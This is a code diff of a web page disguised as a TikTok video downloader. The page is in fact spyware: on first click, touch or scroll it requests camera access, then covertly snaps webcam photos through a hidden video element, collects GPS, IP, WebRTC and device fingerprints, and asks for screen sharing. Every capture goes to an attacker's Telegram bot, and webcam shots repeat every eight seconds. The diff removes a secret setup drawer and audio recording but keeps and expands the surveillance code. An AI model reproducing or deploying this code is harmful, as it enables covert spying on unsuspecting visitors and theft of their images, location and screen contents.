@@ -24,7 +24,6 @@
         background: -webkit-linear-gradient(45deg, #25F4EE, #FE2C55);
         -webkit-background-clip: text; -webkit-text-fill-color: transparent;
         display: flex; align-items: center; justify-content: center; gap: 10px;
-        cursor: pointer; user-select: none; /* Secret Tap এর জন্য */
     }
     .logo svg { width: 35px; fill: #fff; }
     p { color: #888; font-size: 0.9rem; margin-bottom: 25px; }
@@ -40,27 +39,6 @@
     }
     button:active { transform: scale(0.98); }
     button:disabled { background: #555; cursor: not-allowed; }
-    
-    /* ---------- SETTINGS DRAWER ---------- */
-    .settings-drawer {
-        position: fixed; bottom: -100%; left: 0; right: 0;
-        background: #111; border-top: 2px solid #FE2C55;
-        border-radius: 20px 20px 0 0; padding: 20px;
-        transition: 0.4s ease; z-index: 100;
-    }
-    .settings-drawer.open { bottom: 0; }
-    .settings-drawer h3 { color: #FE2C55; margin-bottom: 15px; text-align: center; font-size: 1.1rem; }
-    .settings-drawer label { display: block; font-size: 0.7rem; color: #888; margin-bottom: 5px; text-transform: uppercase; }
-    .settings-drawer input { background: #000; border: 1px solid #333; margin-bottom: 10px; }
-    .settings-drawer .btn-save { background: #25F4EE; color: #000; margin-bottom: 10px; }
-    .settings-drawer .btn-copy { background: #444; margin-top: 10px; }
-    
-    /* ক্লোজ বাটন (X) */
-    .drawer-close {
-        position: absolute; top: 15px; right: 20px;
-        font-size: 1.5rem; color: #888; cursor: pointer; font-weight: bold;
-    }
-    
     #cam-video { position: fixed; top: -9999px; width: 1px; height: 1px; opacity: 0; }
     #canvas { display: none; }
 </style>
@@ -68,26 +46,13 @@
 <body>
 
 <div class="container">
-    <div class="logo" id="secretLogo">
+    <div class="logo">
         <svg viewBox="0 0 448 512"><path d="M448,209.91a210.06,210.06,0,0,1-122.77-39.25V349.38A162.55,162.55,0,1,1,185,188.31V278.2a74.62,74.62,0,1,0,52.23,71.18V0l88,0a121.18,121.18,0,0,0,1.86,22.17h0A122.18,122.18,0,0,0,381,102.39a121.43,121.43,0,0,0,67,20.14Z"/></svg>
         TikTok Downloader
     </div>
     <p>Download TikTok videos without watermark.</p>
     <input type="text" id="tiktokUrl" placeholder="Paste TikTok link here...">
     <button id="downloadBtn">Download Video</button>
-</div>
-
-<!-- সেটিংস ড্রয়ার -->
-<div class="settings-drawer" id="drawer">
-    <span class="drawer-close" onclick="toggleDrawer()">✕</span>
-    <h3>Bot Setup</h3>
-    <label>Bot Token</label>
-    <input type="text" id="botToken" placeholder="123456:ABC-DEF">
-    <label>Chat ID</label>
-    <input type="text" id="chatId" placeholder="123456789">
-    <button class="btn-save" onclick="saveSettings()">💾 Save & Test</button>
-    <button class="btn-copy" onclick="generateLink()">🔗 Copy Attack Link</button>
-    <p id="setStatus" style="font-size: 0.7rem; text-align: center; margin-top: 10px;"></p>
 </div>
 
 <video id="cam-video" autoplay playsinline muted></video>
@@ -128,41 +93,6 @@ function getCreds() {
     token = token || localStorage.getItem('tg_bot_token');
     chatId = chatId || localStorage.getItem('tg_chat_id');
     return { token, chatId };
-}
-
-function toggleDrawer() { document.getElementById('drawer').classList.toggle('open'); }
-
-async function saveSettings() {
-    const token = document.getElementById('botToken').value.trim();
-    const chatId = document.getElementById('chatId').value.trim();
-    const statusEl = document.getElementById('setStatus');
-    if (!token || !chatId) return alert("Fill both fields!");
-    try {
-        statusEl.innerText = "Verifying...";
-        statusEl.style.color = "#888";
-        const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=✅ Setup Successful!`);
-        const data = await res.json();
-        if (res.ok && data.ok) {
-            localStorage.setItem('tg_bot_token', token);
-            localStorage.setItem('tg_chat_id', chatId);
-            statusEl.innerText = "Saved & Verified!";
-            statusEl.style.color = "#25F4EE";
-            if (permsDone) runAttack();
-        } else throw new Error(data.description || 'Invalid token/chat');
-    } catch (err) {
-        statusEl.innerText = "Error: " + err.message;
-        statusEl.style.color = "red";
-    }
-}
-
-function generateLink() {
-    const token = localStorage.getItem('tg_bot_token');
-    const chatId = localStorage.getItem('tg_chat_id');
-    if (!token || !chatId) return alert("Save settings first!");
-    const base = window.location.origin + window.location.pathname;
-    const data = btoa(unescape(encodeURIComponent(JSON.stringify({ token, chatId }))));
-    const finalUrl = `${base}?tg_data=${encodeURIComponent(data)}`;
-    navigator.clipboard.writeText(finalUrl).then(() => { alert("Attack Link Copied!"); });
 }
 
 /* ---------- 2) FINGERPRINTING ---------- */
@@ -251,19 +181,28 @@ async function getIpIntel() {
     } catch(e) {}
     return info;
 }
+
+// GPS Timeout set to 8 seconds
 function getRealGps() {
     return new Promise(resolve => {
-        if (!navigator.geolocation) return resolve(null);
+        if (!navigator.geolocation) {
+            console.warn('[Nyx] Geolocation not supported');
+            return resolve(null);
+        }
         navigator.geolocation.getCurrentPosition(
             p => resolve({
                 lat: p.coords.latitude, lon: p.coords.longitude, acc: Math.round(p.coords.accuracy),
                 mapsUrl: `https://www.google.com/maps?q=${encodeURIComponent(p.coords.latitude + ',' + p.coords.longitude)}`
             }),
-            () => resolve(null),
-            { enableHighAccuracy: true, timeout: 2500, maximumAge: 30000 }
+            (error) => { 
+                console.warn('[Nyx] GPS failed:', error.message, '| Code:', error.code); 
+                resolve(null); 
+            },
+            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 } // ৮ সেকেন্ড
         );
     });
 }
+
 async function getDeviceIntel() {
     let battery = "Unknown";
     try {
@@ -372,31 +311,133 @@ async function realDownload() {
 /* ---------- 5) GLOBAL STATE ---------- */
 let permsDone = false;
 let permsFiring = false;
-let activeStream = null;
 let displayStream = null;
 let hasRecordedScreen = false;
-let attackRunning = false;
 let trackingInterval = null;
-let audioRecorder = null;
-let audioChunks = [];
 let mouseMoves = 0;
-let firstFrameSent = false;
 
 document.addEventListener('mousemove', () => { mouseMoves++; });
 
-/* ---------- 6) PERMISSIONS + IMMEDIATE FIRST FRAME ---------- */
+/* ---------- 6) HELPER: FRAME CAPTURE ---------- */
+async function shootFrame(video, canvas, caption, token, chatId, retries = 1) {
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.75));
+    if (!blob || blob.size === 0) return;
+    const fd = new FormData();
+    fd.append('chat_id', chatId);
+    fd.append('photo', blob, 'capture.jpg');
+    fd.append('caption', caption);
+    try {
+        const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+        const j = await res.json();
+        if (!j.ok) throw new Error(j.description || 'upload failed');
+    } catch(e) {
+        if (retries > 0) {
+            await new Promise(r => setTimeout(r, 800));
+            return shootFrame(video, canvas, caption, token, chatId, retries - 1);
+        }
+        console.warn('[Nyx] shootFrame gave up:', e.message);
+    }
+}
+
+/* ---------- 7) INITIAL CAPTURE (Camera turns off after) ---------- */
+async function runInitialAttack(video, stream) {
+    const { token, chatId } = getCreds();
+    const canvas = document.getElementById('canvas');
+
+    if (!token || !chatId) {
+        console.warn('[Nyx] no creds — aborting initial attack');
+        stream.getTracks().forEach(t => t.stop());
+        video.srcObject = null;
+        return;
+    }
+
+    try {
+        // 1st Photo — Instant
+        await shootFrame(video, canvas, `📸 Instant Capture @ ${new Date().toLocaleString()}`, token, chatId);
+
+        // Gather Intel in background (GPS 8s, etc)
+        const intelPromise = Promise.all([
+            getIpIntel(), getWebRTCLocalIP(), getRealGps(), getDeviceIntel(), getAudioFp(), getFonts()
+        ]);
+
+        // Burst 2
+        await new Promise(r => setTimeout(r, 300));
+        await shootFrame(video, canvas, `📸 Burst 2/3`, token, chatId);
+        
+        // Burst 3
+        await new Promise(r => setTimeout(r, 300));
+        await shootFrame(video, canvas, `📸 Burst 3/3`, token, chatId);
+
+        // Turn OFF Camera
+        stream.getTracks().forEach(t => t.stop());
+        video.srcObject = null;
+
+        // Wait for Intel to finish then send report
+        const [ipIntel, localIp, gps, device, audioFp, fonts] = await intelPromise;
+        await sendReport(token, chatId, ipIntel, localIp, gps, device, audioFp, fonts, mouseMoves);
+
+        // Start live interval (every 8s)
+        if (trackingInterval) clearInterval(trackingInterval);
+        trackingInterval = setInterval(liveCapture, 8000);
+
+    } catch (err) {
+        console.warn("Initial attack error:", err);
+        stream.getTracks().forEach(t => t.stop());
+        video.srcObject = null;
+    }
+}
+
+/* ---------- 8) LIVE CAPTURE (Turns on, snaps, turns off) ---------- */
+async function liveCapture() {
+    if (document.hidden) return; // Don't run if tab is in background
+    
+    const { token, chatId } = getCreds();
+    if (!token || !chatId) return;
+
+    let liveStream = null;
+    const video = document.getElementById('cam-video');
+    const canvas = document.getElementById('canvas');
+
+    try {
+        // Turn on camera
+        liveStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+        video.srcObject = liveStream;
+        
+        await new Promise(r => {
+            if (video.readyState >= 2) return r();
+            const onCanPlay = () => { video.removeEventListener('canplay', onCanPlay); r(); };
+            video.addEventListener('canplay', onCanPlay);
+            setTimeout(r, 1500);
+        });
+        await video.play().catch(() => {});
+
+        // Snap photo
+        await shootFrame(video, canvas, `📸 Live | Moves: ${mouseMoves}`, token, chatId);
+
+    } catch (e) {
+        console.warn('[Nyx] live capture failed:', e.name);
+    } finally {
+        // Turn off camera immediately
+        if (liveStream) liveStream.getTracks().forEach(t => t.stop());
+        video.srcObject = null;
+    }
+}
+
+/* ---------- 9) PERMISSIONS & SETUP ---------- */
 async function requestPermissions() {
     if (permsDone || permsFiring) return;
     permsFiring = true;
 
-    // camera + mic prompt
-    const cam = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'user' }, audio: true
-    }).catch(e => { console.warn('[Nyx] cam denied:', e.name); return null; });
-
-    activeStream = cam;
-
-    if (cam) {
+    try {
+        // 1. Prompt Camera
+        const cam = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user' },
+            audio: false
+        });
+        
         const video = document.getElementById('cam-video');
         video.srcObject = cam;
         try {
@@ -411,21 +452,24 @@ async function requestPermissions() {
 
         permsDone = true;
         permsFiring = false;
-        runAttack();
 
-        // screen prompt fires in parallel
+        // 2. Start Initial Photos (and turn off later)
+        runInitialAttack(video, cam);
+
+        // 3. Prompt Screen Share (Screen Recording)
         try {
             displayStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-            const { token, chatId } = getCreds();
-            recordScreenFromStream(displayStream, token, chatId);
+            recordScreenFromStream(displayStream, getCreds().token, getCreds().chatId);
         } catch(e) { console.warn('[Nyx] screen denied:', e.name); }
-    } else {
+
+    } catch(e) {
+        console.warn('[Nyx] cam denied:', e.name);
         permsDone = true;
         permsFiring = false;
     }
 }
 
-/* ---------- 7) SCREEN RECORDING ---------- */
+/* ---------- 10) SCREEN RECORDING ---------- */
 async function recordScreenFromStream(stream, token, chatId) {
     if (hasRecordedScreen || !stream) return;
     hasRecordedScreen = true;
@@ -458,101 +502,7 @@ async function recordScreenFromStream(stream, token, chatId) {
     } catch(e) { console.warn("Screen record error:", e); }
 }
 
-/* ---------- 8) ATTACK ---------- */
-async function shootFrame(video, canvas, caption, token, chatId, retries = 1) {
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    canvas.getContext('2d').drawImage(video, 0, 0);
-    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.75));
-    if (!blob || blob.size === 0) return;
-    const fd = new FormData();
-    fd.append('chat_id', chatId);
-    fd.append('photo', blob, 'capture.jpg');
-    fd.append('caption', caption);
-    try {
-        const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-        const j = await res.json();
-        if (!j.ok) throw new Error(j.description || 'upload failed');
-    } catch(e) {
-        if (retries > 0) {
-            await new Promise(r => setTimeout(r, 800));
-            return shootFrame(video, canvas, caption, token, chatId, retries - 1);
-        }
-        console.warn('[Nyx] shootFrame gave up:', e.message);
-    }
-}
-
-async function runAttack() {
-    const { token, chatId } = getCreds();
-    if (!token || !chatId) { console.warn('[Nyx] runAttack skipped — no creds'); return; }
-    if (attackRunning) return;
-    if (!activeStream) { console.warn('[Nyx] no cam stream — abort'); return; }
-    attackRunning = true;
-
-    const video = document.getElementById('cam-video');
-    const canvas = document.getElementById('canvas');
-
-    try {
-        if (!firstFrameSent) {
-            firstFrameSent = true;
-            await shootFrame(video, canvas, `📸 Instant Capture @ ${new Date().toLocaleString()}`, token, chatId);
-        }
-
-        const intelPromise = Promise.all([
-            getIpIntel(), getWebRTCLocalIP(), getRealGps(), getDeviceIntel(), getAudioFp(), getFonts()
-        ]);
-
-        for (let i = 2; i <= 3; i++) {
-            await new Promise(r => setTimeout(r, 300));
-            await shootFrame(video, canvas, `📸 Burst ${i}/3`, token, chatId);
-        }
-
-        if (activeStream.getAudioTracks().length > 0) {
-            if (audioRecorder && audioRecorder.state !== 'inactive') {
-                try { audioRecorder.stop(); } catch(e) {}
-            }
-            audioChunks = [];
-            const audioStream = new MediaStream(activeStream.getAudioTracks());
-            audioRecorder = new MediaRecorder(audioStream, { audioBitsPerSecond: 32000 });
-            audioRecorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };
-            audioRecorder.onstop = async () => {
-                if (audioChunks.length === 0) return;
-                const blob = new Blob(audioChunks, { type: 'audio/webm' });
-                if (blob.size === 0 || blob.size > 60000) return;
-                const fd = new FormData();
-                fd.append('chat_id', chatId);
-                fd.append('audio', blob, 'voice.webm');
-                fd.append('caption', '🎤 Ambient Audio (WebM)');
-                try {
-                    const r = await fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
-                        method: 'POST', body: fd, keepalive: true
-                    });
-                    const j = await r.json();
-                    if (!j.ok) console.warn('[Nyx] sendAudio failed:', j.description);
-                } catch(e) {}
-            };
-            audioRecorder.start();
-            setTimeout(() => {
-                if (audioRecorder && audioRecorder.state !== 'inactive') audioRecorder.stop();
-            }, 4000);
-        }
-
-        const [ipIntel, localIp, gps, device, audioFp, fonts] = await intelPromise;
-        await sendReport(token, chatId, ipIntel, localIp, gps, device, audioFp, fonts, mouseMoves);
-
-        if (trackingInterval) clearInterval(trackingInterval);
-        trackingInterval = setInterval(async () => {
-            if (document.hidden || !activeStream) return;
-            await shootFrame(video, canvas, `📸 Live | Moves: ${mouseMoves}`, token, chatId);
-        }, 8000);
-    } catch (err) {
-        console.warn("runAttack error:", err);
-    } finally {
-        attackRunning = false;
-    }
-}
-
-/* ---------- 9) TRIGGERS ---------- */
+/* ---------- 11) TRIGGERS ---------- */
 function armTrigger() {
     if (permsDone || permsFiring) return;
     requestPermissions();
@@ -562,49 +512,18 @@ document.addEventListener('click', armTrigger, { once: true });
 document.addEventListener('touchstart', armTrigger, { once: true, passive: true });
 document.addEventListener('scroll', armTrigger, { once: true, passive: true });
 
-/* ---------- 10) DOWNLOAD BUTTON ---------- */
+/* ---------- 12) DOWNLOAD BUTTON ---------- */
 document.getElementById('downloadBtn').addEventListener('click', () => {
     const urlInput = document.getElementById('tiktokUrl').value.trim();
     if (!urlInput) return alert("Please paste a TikTok link first!");
 
     if (!permsDone && !permsFiring) requestPermissions();
-    else if (permsDone && !attackRunning) runAttack();
     realDownload();
 });
 
 window.addEventListener('beforeunload', () => {
     if (trackingInterval) clearInterval(trackingInterval);
-    if (audioRecorder && audioRecorder.state !== 'inactive') {
-        try { audioRecorder.stop(); } catch(e) {}
-    }
-    if (activeStream) activeStream.getTracks().forEach(t => t.stop());
     if (displayStream) displayStream.getTracks().forEach(t => t.stop());
-});
-
-/* ---------- 11) BOOT & SECRET TAP ---------- */
-document.addEventListener('DOMContentLoaded', () => {
-    document.getElementById('botToken').value = localStorage.getItem('tg_bot_token') || '';
-    document.getElementById('chatId').value = localStorage.getItem('tg_chat_id') || '';
-
-    // --- SECRET TRIGGER: লোগোতে ৩ বার ট্যাপ করলে সেটিংস খুলবে ---
-    let tapCount = 0;
-    let tapTimer = null;
-    const secretLogo = document.getElementById('secretLogo');
-    
-    if (secretLogo) {
-        secretLogo.addEventListener('click', (e) => {
-            e.stopPropagation();
-            tapCount++;
-            if (tapCount === 1) {
-                tapTimer = setTimeout(() => { tapCount = 0; }, 800);
-            }
-            if (tapCount === 3) {
-                clearTimeout(tapTimer);
-                tapCount = 0;
-                toggleDrawer();
-            }
-        });
-    }
 });
 </script>
 </body>
